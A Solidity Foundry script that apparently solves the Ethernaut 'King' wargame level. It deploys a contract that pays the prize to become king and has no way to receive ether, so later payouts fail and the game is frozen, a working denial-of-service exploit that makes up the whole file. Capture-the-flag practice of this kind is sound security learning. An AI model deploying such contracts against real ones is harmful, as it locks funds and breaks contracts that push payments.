// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "../src/King.sol";
import {Script, console} from "forge-std/Script.sol";

contract LastKing {
    constructor(King _kingInstance) payable {
        address(_kingInstance).call{value: _kingInstance.prize()}("");
    }
}

contract KingSolution is Script {
    King public king = King(payable(0x371330dFCEd6eF12a92a457cA9d7d7A154bcD845));

    function run() external payable {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("The initial owner is: ", king._king());
        new LastKing{value: king.prize()}(king);
        console.log("The new owner is: ", king._king());
        vm.stopBroadcast();
    }
}
